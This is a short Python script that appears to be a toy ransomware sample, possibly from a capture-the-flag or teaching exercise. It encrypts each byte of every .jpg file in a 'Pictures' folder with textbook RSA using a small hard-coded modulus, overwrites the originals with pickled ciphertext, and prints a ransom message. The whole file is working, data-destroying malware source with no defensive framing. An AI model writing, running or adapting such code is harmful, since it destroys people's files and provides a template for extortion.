import sys
import pickle
import os

n = 22291846172619859445381409012451
d = 65535

def rsa_encrypt(filename: str) -> None:

    plain_bytes = b''
    with open(filename, 'rb') as f:
        plain_bytes = f.read()
    cipher_int = [pow(i, d, n) for i in plain_bytes]
    with open(filename, 'wb') as f:
        pickle.dump(cipher_int, f)

if __name__ == '__main__':

    directory = "Pictures"  
    for file in os.listdir(directory):
        if file.endswith(".jpg"):
            rsa_encrypt(os.path.join(directory, file))

    print("///////////////////////////////")
    print("////////// ERROR!!!! //////////")
    print("///// Give me ransom ware /////")
    print("///////////////////////////////")
